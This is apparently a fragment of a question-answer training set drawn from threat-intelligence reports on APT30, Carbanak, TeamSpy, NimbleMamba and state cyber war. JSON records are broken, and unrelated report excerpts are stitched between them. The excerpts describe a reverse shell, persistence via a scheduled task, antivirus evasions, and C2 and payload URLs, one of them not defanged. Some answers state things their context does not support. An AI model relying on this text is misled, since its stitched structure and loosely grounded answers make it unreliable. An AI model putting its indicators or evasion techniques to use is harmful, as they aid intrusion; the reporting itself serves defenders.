\"Pa$$w0rd\" seems to be a password to connect to the C2, but it is not used in practice\nC2 server points to: redacted[.]redacted[.]com\nBot-collected data structure is as follows:\nOffset 0x3: hard-coded unknown 16 bytes computed by custom unknown encode functions\nOffset 0x13: username using function GetUserNameA()\nOffset 0x43: computer name using function GetComputerNameA()\nOffset 0x73: file name being executed using function GetModuleFileNameA()\nOffset 0x178: IPV4 addresses using function GetAdaptersInfo()\nOffset0x1b8: MAC addresses using function GetAdaptersInfo()\nPersistence is achieved via Windows Task Scheduler, where a task named \"WinUpdate2\" is created to run every day at 10:10 AM. Task Scheduler functions are abused by using its COM object via the CoCreateInstance() function.\nBig Headline: Reverse Shell\nFinally, the reverse shell is executed in a stealthy way. First, it gets the default standard handle by calling GetStdHandle(), then the ComSpec variable is retrieved using the GetEnvironmentVariableW() function, which by default is set to \"C:\\Windows\\system32\\cmd.exe\". After that, a pipe is created using CreatePipe(), and CreateProcessW() is executed, creating \"cmd.exe.\"\nBesides the reverse shell, the final payload can collect a complete list of directories on the victim's system by using the function GetLogicalDeviceStringsW(), looping through the list of files using FindFirstFileA()/FindNextFileA(), and then comparing with \"..\" to see if a given file is actually a directory.\nDuring our investigations, we found two samples from mid-2022: \"5[redacted sha-256]7\" and \"5[redacted sha-256]8\", which is also a reverse shell with a hard-coded C2 at \"[redacted][.]165\" \u2014 the same IP address that the C2 server from the 2023 samples are pointing to. Both samples were\ntargeting the aerospace industry.\nWhile the 2022 samples are obfuscated, unlike the 2023 samples, they do not contain stealthier functions such as API hashing, anti-analysis techniques, or encrypted static configuration. They also don't include the capability to list directories, nor are they able to send information to a remote server.\nBig Headline: Conclusions\nGiven the relatively sophisticated technical capabilities this threat actor deployed and the victim's timelines, we conclude with a high degree of confidence that this was a commercial cyberespionage campaign. Its purpose was most likely to gain visibility over the internal resources of its target in order to weigh its susceptibility to a future ransom demand.\nBased on the threat actor's operations timelines \u2014 September 2022 and then July 2023 \u2014 we can surmise that this shows the group's interest in the target remained consistent between the first and second campaign, as evidenced by the increased complexity of the second campaign compared to the first. During the time that elapsed between the two campaigns we observed, the threat actor put considerable effort into developing additional resources to ensure they could secure access to the sought-after information, and that they could exfiltrate it successfully.\nBig Headline: APPENDIX 1 \u2013 Referential Indicators of Compromise (IoCs)\nDisclaimer: The private version of this report is available upon request.

The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes \u2013 that is, each domain is associated with different URIs whose associated files support different functions.\nFor this sample, the four C2 domains have the following roles:\n\u2022 Domain 1 (D1): www.bigfixtools[.]com. This is the primary first-stage C2 domain, used with the majority of the URIs (and their associated functions).\n\u2022 Domain 2 (D2): (www.km153[.]com) is the backup C2 domain, which can be promoted to the primary first-stage domain instead of D1 if necessary. It also can be used to obtain \"run/hide\" configuration data (see below).\n\u2022 Domain 3 (D3) and Domain 4 (D4) (www.km-nyc[.]com and www.bluesixnine[.]com, respectively) are used to obtain \"run/hide\" configuration data.\nThe C2 domains used by APT30 is a single malware sample range from the \"brand new\" to more \"historical\" domains that have been in existence (and use) for several years. For reference, sample 6ee35da59f92f71e757d4d5b964ecf00 was compiled on 8/28/2014 at 09:12:33 GMT; the spear phishing attacks that dropped this BACKSPACE variant occurred on 8/29/2014.\nTable 9: BACKSPACE C2 domains and registration dates.\nMedium Headline: \"Run\" vs \"Hide\" Mode\nBACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\\Software\\Microsoft\\ CurrentPnpSetup.

    "instruction": "Context: Medium Headline: The need for action\nHowever, effective awareness requires continuous effort to remain vigilant. In this aspect the financial institutions seem to be doing a better job in understanding the potential \"enemy\" compared to the other industries, including the ENR sector.\nThe Obama administration submitted a cyber security proposal to Congress last May to outline its priorities for cyber security and to press lawmakers to pass comprehensive legislation to protect critical U.S. infrastructure that powers the Internet, utilities, and other control systems that are vulnerable to attack.\nFeds Simulate Crippling Cyber security Attack On NYC Electricity [March 2012]\nAdvances in technology and mounting concern about the potential for a cyber attack to damage power stations, water-treatment plants and other critical systems have prompted senior officials to seek a more robust role for the department's Cyber Command. For one thing, cyber attacks can take place in milliseconds. The assailant may be unknown. The attack route may be hard to trace, crossing multiple countries.\nPentagon proposes more robust role for its cyber-specialists [August 2012]\nIran is to move key ministries and state bodies off the worldwide internet next month in an effort to shield them behind a secure computer wall from disruptive cyber attacks like the Stuxnet and Flame viruses. \"The establishment of the national intelligence network will create a situation where the precious intelligence of the country won't be accessible to these powers.\"\nIran to unplug from Web to escape 'Internet monopoly' [August 2012]\nThe key is to be able to understand the motives behind a cyber attack. It must be made clear the cyber world is no longer playing in the \"minor league\", but rather the \"major league\" with players who potentially have access to unlimited resources and endless patience in achieving an aforementioned objective.\nOn a second note it is extremely necessary to conduct thorough analysis of risks and have a clear understanding of the different asset value perception. What seems of little value to one firm might be worth a lot more to attackers who have a totally different perspective or who are planning an attack on a chain of companies.\nAs a result, consideration should be given to the relationship between the costs for implementing detective controls and costs of incidents. The latter should include indirect damages incurred on consumer confidence and reputation, the two most valuable assets of a company.\nA 2012 survey titled \"A nuanced perspective on cybercrime\" which was conducted by KPMG in Netherlands,\nstated that out of the 170 responding organisations under various sectors including ENR, approximately 19 percent of them spend more than 1.5 million euros on cybercrime prevention, detection and response per year.\nThirdly, whether short term measures or long term controls have been implemented, the upper management of companies should never be complacent and believe that they enjoy 100 percent security. The IT landscape in many modern organisations is simply often too complex for complete protection.\nThe same 2012 KPMG survey also revealed that 45 percent of companies experienced attempts of cybercrime attacks in 2011. In addition, 55 percent of respondents were unsure of whether they can effectively respond to a cybercrime attack, and only 20 percent said they can respond effectively to an attack but unfortunately do not have an attack response plan in place. Among all the responding corporates, approximately 30 percent have forensic capabilities as a control and only 55 percent have central incident and event monitoring capabilities.\nMost importantly, it is vital for the management to set the correct tone. KPMG's experience with clients has shown over and over again that security is largely a management issue.\nThe survey also showed that more than 75 percent of respondents believe that fighting cybercrime goes beyond installing the needed technology to curb it. Some 90 percent of them also agree that cybercrime should be discussed at the board level.\nMedium Headline: So are companies in the ENR industry up to the challenge?\nMost respondents  from the ENR sector of the same KPMG survey do not think so. They believe that hackers are more likely to win in this sector compared to other industries.\nIf a company does not consider itself to be ready, actions must be taken. Management should endorse prevention efforts and start seeking a structured approach.\nThere also has to be effective use of security monitoring and seamless cooperation between the different parties involved so that knowledge and expertise can be shared among government, business communities, IT security groups and even cross-border organisations.\nBeyond the prevention of incidents, timely detection and an adequate\nresponse are also critical. If there is any major gap or deficiency in the policies, procedures and tools of a company, the worst time to discover these would be when a cyber security incident is already set on its course.\nIn terms of short-term actions, the company could perform risk analysis from the perspective of an attacker, identify and monitor critical assets as well as begin implementing a standby incident response team.\nIn the long run, companies should strive for cost-effective control of the cyber environment by addressing the domains of people, processes and technology.\nYet, even the most comprehensive security control system cannot guarantee the complete prevention of cyber incidents. An incident response plan and an emergency action plan is therefore\nalso of paramount value in the proper handling of a security compromise and reducing the subsequent damage.\nIf a thorough and detailed plan is not available, the very least an organisation should do is to be familiar with some basic concepts and simple primary actions to respond to an incident. (See Figure 5 below). This helps the company achieve more effective business resilience, which is important especially for the protection of the most critical assets. The fundamentals of cybersecurity are probably best summed up by Ron Ross, National Institute of Standards and Technology (NIST) Senior Fellow, who said during a launch of NIST's latest guidance on security controls: \"The fundamentals of cyber security \u2026 I call it the physics of security \u2026 don't change over time \u2026 how we apply those controls ... is a little bit different, but the same fundamentals.\"\nSource: 2012 KPMG paper \"A nuanced perspective on cybercrime\".\nMedium Headline: Suggested frameworks\nGiven the shifting perspective of the defence against cybercrime, a more modern approach to cyber security therefore also focuses on the perspective of the criminals.\nIn terms of risk assessment, the organisation must not only consider itself as an attractive end target, but also consider its part in the supply chain. It should also not view itself as one entity that should be protected, but as a collection of processes, users and IT infrastructure.\nCompanies should focus on being well informed of (the character) of possible threats and invest in a proper defence. They should not do this in an isolated way, but rather use the knowledge and experience of colleagues in both the public and private sector. A joint response is essential for protection\nagainst cyber espionage, terrorism, crime and disruption of information and communication systems.\nAnswer this question: What are the key components of a comprehensive cybersecurity strategy as suggested by the APT report 'energy-at-risk', and why are they important for companies in the ENR sector?",
    "output": "The key components of a comprehensive cybersecurity strategy as suggested by the APT report 'energy-at-risk' include effective use of security monitoring, seamless cooperation between different parties, timely detection, and an adequate response. These components are important because they help in sharing knowledge and expertise among government, business communities, IT security groups, and even cross-border organizations. Moreover, identifying gaps in policies, procedures, and tools before an incident occurs is crucial to minimize damage and ensure business resilience.",

The file was named \"PYvBte.jar\" but was actually a Windows executable. The file has the characteristics listed in Table 3, and appears to be a stand-alone executable version of the Metasploit Meterpreter shell. When this file runs, it downloads a payload from uyghurweb.net/player/gmuweb.exe and executes it. This file is the same Poison Ivy RAT described in Table 2.\nThe Meterpreter payload masquerades as a copy of the ApacheBench tool made by the Apache Software Foundation.\nBig Headline: Table 4\nBased on historical IP resolution overlaps between the above C2 domains and other domains that have also resolved to the same IPs, we found an additional sample from the beginning of this year.\nInterestingly, the first sample was not logged in VirusTotal prior to our submission, despite the sample having been in use in the wild for at least seven months.

According to the prevailing assumption, this war should have seen serious and open cyber war strategies and tactics. Both countries have technologically advanced societies and weaponry that at least came up to 1990 standards of modernity. Both countries have a strong information technology (IT) base, and hackers a-plenty, although many of them are engaged in organised crime rather than working for the state.2 Russia's state-sponsored hackers are widely believed to be on par with, or very close to, NSA-level standards.\nThe most notable thing about the war in Ukraine, however, is the near-complete absence of any perceptible cyber war. There has been vigorous cyber espionage,3 the targeting of cell phones by Russian electronic warfare, and the use of old-fashioned bolt-cutters to sever lines of communication in Crimea.4 Patriotic hacktivists on both sides have conducted harassing but small cyber attacks against each other,5 both sides have conducted Distributed Denial-of-Service (DDoS) attacks (e.g., by Russia against Ukraine's parliament),6 and\na (fruitless) campaign to corrupt voting processes in Ukraine.7 However, we have seen nothing comparable to the cyber attacks carried out against Estonia in 2007 or Georgia in 2008.\n1 As Richard Clarke and Robert Knake maintain in Cyberwar, The Next Threat to National Security and What to do About It, New York NY: HarperCollins, 2010; see also David Makovsky.

In this regard, Moscow has a competitive advantage over Kyiv. The two countries share a common language, Russian (the use of the Ukrainian language is growing fast, but that language is Slavic), and most Russian-language-friendly sites such as VKontakte (the Russian Facebook) are headquartered in Russia. That said, little if any of the conflict taking place in social media requires subverting computers through the discovery of vulnerabilities or the engagement of exploits.\nIn particular, there are two major forms of cyber attack that have not taken place in the Russo-Ukrainian conflict: attacks on critical infrastructure and attacks on defence systems. It is possible that, in the future, we may learn that there have been such attacks, but that they were simply subtle enough to slip under the radar. With Stuxnet, Iran's centrifuge plant at Natanz was infected for six months, with centrifuges failing at unexpected rates, before Iranian engineers understood why. Successful cyber attacks could indefinitely be ascribed to incompetent management before a complete picture is understood. And as for military systems, credible stories of their successful attacks may emerge years later, when people are freer to talk about what happened in the war.\nTwo major forms of cyber attack have not taken place: on critical infrastructure and on defence systems.\nEven with all of that in mind, in the Internet era it has become difficult to keep secrets for long periods of time, and the growing absence of cyber attack evidence is turning into the evidence of absence.\nRead the text above and answer this question: Why might the absence of evidence of cyber attacks in the Russo-Ukrainian conflict be significant, and what implications does this have for our understanding of cyber war?",
    "output": "The absence of evidence of cyber attacks in the Russo-Ukrainian conflict is significant because it challenges the prevailing assumption that modern wars between technologically advanced countries would necessarily involve serious and open cyber war strategies and tactics. Despite both countries having strong IT bases and capable hackers, the conflict has seen little in the way of major cyber attacks. This suggests that cyber war may be more myth than reality in this context. The lack of evidence of attacks on critical infrastructure and defence systems further underscores this point. While it is possible that subtle attacks have gone undetected, the growing absence of evidence is turning into the evidence of absence, indicating that cyber war may not be as prevalent or effective as previously thought.",

These IP addresses corresponded to a mix of public and private financial institutions globally, with a prominent focus on Polish and Mexican banks. The IP whitelist filtered traffic such that only IPs on specified subnets would be delivered the exploit and payload. This strategy was effective because it allowed the attackers to precisely target their intended victims, ensuring that the malicious payload was only delivered to those within the financial institutions they were interested in compromising.

But clearly, the strategy guiding this team is to pull off multiple \"watering hole\" attacks, and sometimes pollute ad networks, inefficiently blanketing the region they are most interested in with malvertizing and redirections to their malicious sites. These two servers have been heavily used over years of attack campaigns, with more recent servers receiving tens if not hundreds of hits in the past week.\n\"politnews.org\" was originally registered on the June 18th, 2004 by one \"Zacepenko Ilia Igorevich\" at OnlineNIC Inc:\nZacepenko Ilia Igorevich\n9th square, 10-1,1\nNI Larne, GB 127591\npolitnews@mail.ru\n\"bannetwork.org\" was originally registered on September 2nd, 2004 by one \"Dmitryi Ivastov\" at OnlineNIC Inc as well:\nDmitryi Ivastov\nMira street, 1a\nMoscow, RU 103555\nbannetwork@mail.ru\nWe believe that these are fictional identities and used only to register these individual domains.\nThe two servers resided at several hosts over the past decade, but from 2010, both domains were maintained at Russian provider Host Telecom. (known malicious IP for \"bannetwork.org\": \"89.188.104.7\").\nFor the most part, these systems maintain identical toolsets, structure, software and accounts. Both of these systems hosted an FTP server and an Apache HTTP web server, along with the same user accounts for running each. The HTTP servers were used to serve \"job.txt\", which maintained a set of system commands for agents checking in, among other files described below. Interestingly, other files included \"html\" pages and exploits related to the well-known exploit kit \"\", created and maintained by Exmanoize.\nAlso, one of the server scripts to collect infection success statistics mentions the Eleonore exploit kit by name:\nAnd one of the more recent, current sites, \"checkmeil.com\", is serving both malicious java and pdf files. Of course, just like Eleonore started serving couple of years ago, it defaults to deliver a malicious JAR file first, prior to other exploits potentially sent to the victim system.\nThe 2012 version of \"door.jar\" (CVE-2012-0507) exploit is blocked proactively by our AEP functionality at runtime and detected by Kaspersky products as \"HEUR:Exploit.Java.CVE-2012-0507.gen\".\nA malicious PDF is served if the Java Runtime is not present on the system. Our products detect this particular malicious file as Exploit.JS.Pdfka.gbf.\nMost of the TeamSpy servers are using a free, Russian open source tool named \"\". This is a set of PHP scripts designed to \"read and display RSS feeds on your site\". Most likely, the attackers planned their attacks well in advance and built a set of web sites using these scripts to provide news aggregation channels serving content at least somewhat relevant to their target victims' favorite web sites.\nOver the past years, the attackers added exploit packs like Eleonore on their news aggregation sites. Then, the attackers injected iframes into carefully selected web sites frequently visited by their target victims. The iframes redirect these target visitors (and some extras) to their previously-prepared malicious sites. For instance, redirections from \"konflikt.ru\" to the attackers' \"bannetwork.org\" started in October 2005. In February 2006, users were redirected from \"daymohk.org\" to \"bannetwork.org\", followed by \"www.turkmenistan.gov.tm\" and \"chechentimes.net\" in March. The list of infected watering hole sites continued to grow from there.\nAttacks from the \"bannetwork.org\" site appear to have been related to the following links by at least February 2010:\nbannetwork(dot)org/5058/spl/\nbannetwork(dot)org/5058/spl/inc/function.php\nbannetwork(dot)org/5058/spl/ms-041.jpg\nbannetwork(dot)org/5058/spl/vx_2c.exe\nbannetwork(dot)org/5058/spl/new-ms-041.jpg\nBased on the server access stats, we were able to put together a thorough list of web sites which appear to have acted as referrers to the exploit packs.

    "instruction": "Big Headline: 2. A New Era\nHistory has demonstrated that the advantage often goes to those who develop a technology first. The great naval voyages of Ming admiral Zhang He were unprecedented for their time and helped establish China as a suzerain of the wider Asian region. However, the mid-15th century saw China retreat to xenophobic and isolationist policies that paved the way towards China's decline and opened the door for colonialism (see Dick 2006). This lesson has not been lost among Chinese officials, and it is often used to spur initiatives such as their stated desire to be the first to mine the moon for helium-3 (China's Space Program 2005). The information revolution has given more power to individuals and increased globalization through the interconnectedness of economies, rapid dissemination of news, and improved access to communication and information of all types. Any attempt to compete on a global level without the use of these technologies would place the PRC at a significant military and financial disadvantage. For this reason, the benefits of electronic reliance outweigh the risks involved. Further, it is impossible for a state to develop a defence against cyber warfare without simultaneously learning how to execute attacks themselves.\nThe US is the sole superpower, making it a benchmark for military competitiveness. Beijing also views the US as a potential adversary, in particular due to perceptions of the US military attempting to encircle China with bases in nearby states and opposition to China's modernization goals, to concerns over any forceful application of the One China Policy, and to concerns over a range of internal affairs issues.  China seeks to learn from US mistakes and successes, using American expertise and field-tested military experience to accelerate China's development. The People's Republic also focuses on weaknesses in the US military in order to improve upon the American example and to expose asymmetric advantages. For these reasons it is important to examine where the US is headed in military thinking and development, as China is likely to follow (Derene 2008; Lasker 2005; Liang Xiangsui 1999).\nMedium Headline: Network-Centric Warfare\nThe US has viewed the internet as a potential tool of warfare since its inception. Arpanet, a precursor of modern internet, was heavily funded by the US military, with a particular emphasis on its research collaboration benefits. Despite fears of cyber terrorism post 9/11, the US continues to place increasing reliance on the internet as a security tool. This can be seen in the restructuring of US intelligence agencies and the creation of new online exchange such as Intellipedia and A-Space (Shaughnessy 2008; Magnuson 2006). Militarily, the information revolution has given rise to an increasing reliance on situational awareness, weather monitoring, surveillance, communication, and precision strikes. Chinese military strategists have made special note of the US reliance on, and dominance with, electronic means in the Kosovo, Afghanistan, and Iraqi conflicts (Tellis 2007; Center for Strategic and International Studies 2003; Liang and Xiangsui 1999).\nSince the 1990s the US has put emphasis on developing network-centric warfare (NCW).  NCW seeks to translate an information advantage, enabled in part by information technology, into a military advantage through the networking of well informed, geographically-dispersed forces. Originally described as a system of systems, it includes intelligence sensors, command and control systems, and precision weapons that enable enhanced situational awareness, rapid target assessment, and distributed weapon assignment. In essence, NCW translates to information superiority, which requires the reduction of hard categorization, because compartmentalizing military branches can stem the flow of information.  In 2001, the\nPentagon began investing in peer-to-peer software as a means to spread information while supplying redundancy and robustness. The US Department of Defense has sought the creation of the Global Information Grid (GIG) as a backbone of NCW. All advanced weapons platforms, sensor systems, and command and control centres are eventually to be linked via the GIG. Collecting, processing, storing, disseminating, and managing classified security information on demand will be made globally available to soldiers, policymakers, and support personnel to achieve information superiority (Alberts 2002; Alberts, Garstka, and Stein 2000).\nVice President Richard Cheney stated in 2004:\nWith less than half of the ground forces and two-thirds of the military aircraft used 12 years ago in Desert Storm, we have achieved a far more difficult objective . . . . In Desert Storm, it usually took up to two days for target planners to get a photo of a target, confirm its coordinates, plan the mission, and deliver it to the bomber crew. Now we have near real-time imaging of targets with photos and coordinates transmitted by e-mail to aircraft already in flight. In Desert Storm, battalion, brigade, and division commanders had to rely on maps, grease pencils, and radio reports to track the movements of our forces. Today, our commanders have a real-time display of our armed forces on their computer screen (Raduege 2004).\nMedium Headline: Information Operations\nIn 2003, under the direction of former Secretary of Defense Donald Rumsfeld, the US expanded on NCW in a document titled the Information Operations Roadmap. Now declassified, it was obtained under the Freedom of Information Act by George Washington University's National Security Archive. Information Operations (IO) calls for NCW to become a core military branch along with the Army, Navy, Air Force, Intelligence, and Space. To accomplish this it requires the development of a comprehensive education program to enlist new recruits, and an overhaul of the organizational structure of current military branches in an attempt to break down barriers that hinder information exchange and progress. IO activities include PSYOPS troops who try to manipulate the adversary's thoughts and beliefs, military deception and disinformation, media warfare, electronic warfare (EW), and computer network operations (CNO). Thus Information Operations Roadmap stands as an another example of the US commitment to transform military capabilities to keep pace with emerging threats and to exploit new opportunities afforded by innovation and rapidly developing information technologies.\nIO seeks to \"dominate the electromagnetic spectrum\", in an attempt to \"deny, degrade, disrupt, or destroy a broad range of adversary threats, sensors, command and control and critical support infrastructures\" (Information Operations Roadmap 2003). The document notes that PSYOPS and manipulating the thoughts of populations through media and internet require constant observation during peacetime, otherwise in the event of conflict, a state would not be sufficiently engrained into the information culture to utilize them fully. This can be seen with the emergence of patriotic hackers, the advancement of social media, and the rapid evolution of memetics, slang, and subcultures, all of which will be discussed further below (List of Internet Phenomenon 2008; Pang 2008; Slashdot Subculture 2008; Slashdot Trolling Phenomenon 2008). IO includes defence, attack, and reconnaissance as vital components (Information Operations Roadmap 2003).\nIO seeks to put out a political message in coordination with any traditional military assault.  It places an emphasis on finding, and clandestinely promoting, favourable media from third\nparties, so as to appear more credible. IO also seeks to establish a legal framework to defend against cyber attacks and cyber reconnaissance, as well as establish rules of engagement for conducting cyber attack. For example, how much certainty is required in identifying the source of an attack before responding? If an attack is being routed through multiple computers, is it acceptable to attack the intermediary computer? This would halt the attack but it would harm or destroy a computer which may have been infected without the owner's knowledge or consent. Additionally, an intangible computer attack can result in significant tangible loss, but does this warrant the use of traditional military weapons as a response?\n\nBased on the above text, answer a question. Why is it crucial for the People's Republic of China (PRC) to develop cyber warfare capabilities, and how does the US serve as a model for China's military development in this area?",
    "output": "It is crucial for the PRC to develop cyber warfare capabilities because it allows China to compensate for its traditional military hardware deficiencies and provides an asymmetric advantage to deter aggression from stronger military powers. The US serves as a model for China's military development because it is the sole superpower and a benchmark for military competitiveness. China seeks to learn from US mistakes and successes, using American expertise and field-tested military experience to accelerate its own development. By examining where the US is headed in military thinking and development, China can identify and improve upon weaknesses in the US military.",

    "instruction": "Medium Headline: Navy\nThe People's Liberation Army Navy (PLAN) is composed of 250,000 personnel divided into three major fleets, the North Sea Fleet, East Sea Fleet, and South Sea Fleet, each containing surface ships, submarines, naval air force, coastal defence, and marine units. China's naval force includes 57 attack submarines, 55 medium and heavy amphibious ships, and 49 coastal missile patrol craft. A priority has been placed on anti-air capabilities with improvements in over-the-horizon targeting, range, and accuracy in surface-to-air missiles. \"Taking informationization as the goal and strategic focus in its modernization drive, the Navy gives high priority to the development of maritime information systems, and new-generation weaponry and equipment\" (China's National Defense in 2006). As a part of PLAN's modernization program, PLAN has been developing blue water navy capabilities.\nPLAN does not currently have an aircraft carrier. However, evidence suggests they are pursing such technology and have the capability to construct one. Renovation to a former Soviet Kuznetsov-class aircraft carrier may be used for training purposes, and the Chinese have expressed interest in acquiring Russian Su-33 carrier-borne fighters. The ex-Australian carrier Melbourne also provided research for the PLAN as it was towed to China for scrap. Russian assistance, coupled with an already capable ship building infrastructure, could allow PLAN to rapidly develop an aircraft carrier. The PLAN's ambitions include operating out to the first and second island chains, extending operations to the South Pacific near Australia, north to the Aleutian Islands, and west to the Strait of Malacca towards the Indian Ocean (Annual Report to Congress 2008).\nChina's submarine fleet is derived from outdated Russian technology and is seeking to become a more modern and smaller force. Early Chinese submarines were domestically produced versions of the Soviet Romeo class submarine, which were only capable of coastal patrols with deployment to sea limited to a few days per year. One Romeo was modified to carry six YJ-1 (C-801) anti-ship missiles, but it had to surface to fire them. The Chinese Ming class submarines produced in the 1970s were not much better, other than being of newer construction. This was followed by the Song class submarine, which had a streamlined hull and can be fitted with anti-ship missiles capable of being fired while submerged. China returned to purchasing subs in the late 1990s with the Russian Kilo class submarine. The Type 041 Yuan Class is the newest diesel-electric submarine in the PLAN.  Its design incorporates parts of the Song class and Russian Kilo class submarines. The Yuan class has five torpedo tubes capable of launching indigenous torpedos as well as Russian\ndesigned torpedos, and it is believed to have anti-ship missiles. This ship was designed to replace the aging Romeo and Ming class submarines which currently form the backbone of the PLAN's submarine fleet (Chinese Submarines 2008; see also China's Navy 2007).\nChinese produced Han class nuclear submarines were plagued with problems. A follow-on Type 093 nuclear submarine was developed with experience from the Han class and further assistance from Russian submarine builders, such as advanced wielding and construction techniques. Despite being armed with new Chinese wire-guided torpedoes; the Type 093's overall capability remains comparable to Russian technology of the late 1970s. Nevertheless, China continues to make progress and the true level of Russian assistance lacks transparency (Smith 2001). Further, the Type 093 may have benefited from German fuel cell technology and French design, which could allow for two to three weeks of submerged operations without having to surface to recharge batteries. Internet-source photos of Type 039s under construction also show Chinese mastery of advanced multi-layer rubber/polymer hull coatings that greatly reduce hull-radiated noise while limiting the effectiveness of active-sonar detection (Chinese Submarines 2008).\nChina maintains a fleet of approximately 28 destroyers, 48 frigates, and 30 ocean-capable fast attack craft. The frigates were designed for anti-surface warfare, and lacking significant self-defence. Chinese-built destroyers include the Luhu class, the Luhai class, and the Luda I/II/III, from oldest to newest, respectively. The Luhai and Luda class are armed with a battery of guns, torpedos, mortars, optional helicopter pads, and domestically built Crotale SAMs which were built from designs provided by France in the 1980s. Construction of the Luhai class was delayed from the mid 1980s to the mid 1990s due to construction of frigates for the Thai Navy. The most powerful addition to the PLAN is the Russian-built Sovremenny class destroyers. These include MOSKIT anti-ship missiles and KASHTAN combined gun/missile ship defence systems. While these designs are non-stealth 1970s Russian technology, outdated by current designs, they provided the PLAN with modern anti-ship, anti-air, and anti-submarine systems. The most recent Sovremenny acquisitions carry 8 Sunburn supersonic sea-skimming ASM and the SA-N-7 Gadfly, which will give PLAN limited naval air-defence capability. Up to this point, China only possessed short-range SAMs of French or domestic design (Surface Combatants 2008; IISS 2008).\nImprovements in stealth design of the PLAN's ships further the notion that China seeks to modernize by purchasing or clandestinely obtaining technology from other states, reverse engineering that technology, and then attempting to make upgraded domestically produced versions.  According to Frank Moore of the Institute for Defence and Disarmament Studies:\nThe PLA developed new stealthy warships benefiting from Russian or Ukrainian design advice, weapons, electronics and other systems, plus new computer aided design methods which speeded their development. By 2002 it was possible to observe the construction of three new classes of warships via Chinese internet sources ... the No. 168 class, which armed with Russian SHTIL SAMs, Russian radar, Kamov Ka-28 ASW helicopters and Chinese C-802/803 anti-ship missiles, and powered by Ukrainian gas turbine engines. Soon after two No. 170 class destroyers were launched. These featured large phased array radar similar in appearance to the U.S. AEGIS system... Most likely the new \"AEGIS\" radar comes from the Ukrainian KVANT bureau and is a newly-developed active phased array radar with a broad search range of about 150km ... In 2003 [PLAN] launched two Type 054 stealthy frigates. Some sources indicate production was halted at two ships pending the completion of a new Russian SAM... In early 2004 internet-source pictures of a model of this new variant, apparently from a Chinese shipbuilding exhibition, confirmed that it will feature a new vertical-launched SAM and be outfitted with Russian radar and missile guidance systems. The Type 054 is also powered by co-produced French-designed SEMT Pielstick marine diesel engines.\nA fourth stealthy warship emerged in April 2004: a new fast-attack craft (FAC). Now being produced at two or three shipyards, this new FAC utilizes a wave-piercing catamaran (twin) hull design, which improves stability at high speeds even in rough seas. It is based on a design obtained from the Australian fast-ferry firm AMD... [with] radar-absorbing materials applied to the hull. (Moore 2000).\nNot only does this illustrate China's use of foreign technology, it also demonstrates the complexity of modern warfare. These are highly sophisticated weapons, weapons pieced together from multiple sources, the existence of which was leaked onto the internet.\n\nQ: How does the People's Liberation Army Navy (PLAN) aim to modernize its capabilities, and what specific technologies and strategies are being employed to achieve this goal?",
    "output": "A: The PLAN aims to modernize its capabilities through several key initiatives. Firstly, it prioritizes the development of maritime information systems and new-generation weaponry. Additionally, PLAN is pursuing blue water navy capabilities, which involve operating beyond coastal waters. Specific technologies include the development of an aircraft carrier, possibly using renovated Soviet Kuznetsov-class carriers for training and acquiring Russian Su-33 carrier-borne fighters. PLAN is also modernizing its submarine fleet, transitioning from outdated Russian technology to more advanced models like the Type 041 Yuan Class, which incorporates elements from the Song class and Russian Kilo class submarines. Furthermore, PLAN is enhancing its stealth capabilities by integrating foreign technology, such as Russian or Ukrainian design advice, weapons, and electronics, and using computer-aided design methods to develop new stealthy warships like the No. 168 class, No. 170 class destroyers, and Type 054 stealthy frigates.",

    "instruction": "New Carbanak / Anunak Attack Methodology\nPosted By Brian Hussey\nIn the last month Trustwave was engaged by two separate hospitality clients, and one restaurant chain for investigations by an unknown attacker or attackers. The modus operandi for all three investigations were very similar and appear to be a new Carbanak gang attack methodology, focused on the hospitality industry. Carbanak is a prolific crime group, well known for stealing over one billion dollars from banks in 2015 (*Kaspersky estimated loss) and more recently orchestrating an attack on the Oracle Micros POS support site that put over one million Point of Sale systems at risk. The current investigations are still underway but the known indicators of compromise in these new attacks will be presented below. At the time of investigation this malware was not correctly detected by any existing antivirus engines, and domains / IP's were not found in any commercial threat intelligence feeds.\nIt is also interesting to note that just during the time that it took to write this blog, Carbanak returned to their victims with significantly upgraded malware. This demonstrates the speed and versatility of this threat group. We have included analysis for two separate versions of AdobeUpdateManagementTool.vbs in this report. (The malware used following the initial infection) Version two arrived only two weeks after we began investigating this new campaign.\nQ: Why did the Carbanak/Anunak group target the hospitality industry in their new attack methodology, and how does this shift highlight the versatility and adaptability of this APT group?",

This group, known for stealing over one billion dollars from banks in 2015 and orchestrating an attack on the Oracle Micros POS support site, showcased their ability to quickly evolve their tactics. During the investigation, it was noted that the malware used in these attacks was not detected by any existing antivirus engines, and the associated domains/IPs were not found in any commercial threat intelligence feeds. Furthermore, within just two weeks of the start of the investigation, Carbanak returned with significantly upgraded malware, illustrating the speed and sophistication of their operations.

    "output": "NimbleMamba is a TA402 implant written in C# and delivered as an obfuscated .NET executable using third-party obfuscators like SmartAssembly. It uses the Dropbox API for both command and control (C2) and exfiltration. NimbleMamba contains multiple guardrails to ensure that the malware only executes on targeted machines, using IP resolving web services to check the user's IP address and determine if it fits into the target region. It also performs basic virtual machine checks to avoid detection. Compared to its predecessor, LastConn, NimbleMamba shares similarities such as being written in C#, using base64 encoding within the C2 framework, and utilizing the Dropbox API for C2 communication.

For example, the function AVDetect in AV.cpp iterates processes to detect AV by process name hash as shown in Figure 1.\nWhat does CARBANAK do with this information? It evades AV according to what is installed. Figure 2 shows the code for an AVG evasion that the authors disabled by commenting it out. (<https://twitter.com/nopandroll>)Based on this, it appears as if the AVG evasion was retired, but FLARE team member confirmed in November 2017 that it still worked with one minor tweak. FLARE disclosed this to AVG immediately upon confirming it. Avast indicates that after our disclosure, they updated the affected DLL to ignore DLL_PROCESS_DETACH and leave its hooks in place.\nIn November of 2017, FLARE also disclosed an evasion for Trend Micro's detection of process injection that remained active in the CARBANAK source code. The evasion mirrors a technique used in that replaces remote heap allocation and a call to CreateRemoteThread with memory mapping and queueing of an asynchronous procedure call via QueueUserAPC. Following our disclosure, Trend Micro indicated that they had updated their behavior monitoring rules and released OfficeScan XG SP1 in December 2017 with a new \"Aggressive Event\" detection feature that covers this behavior.\nBig Headline: Author Characterization\nHaving source code could pose unique opportunities to learn about the individuals behind the keyboard. To that end, I searched for artifacts in the source code dump that might point to individuals. I found the most information in Visual Studio solution files. Most of these referenced drive O: as the source root, but I did find the following host paths:\nC:\\Users\\hakurei 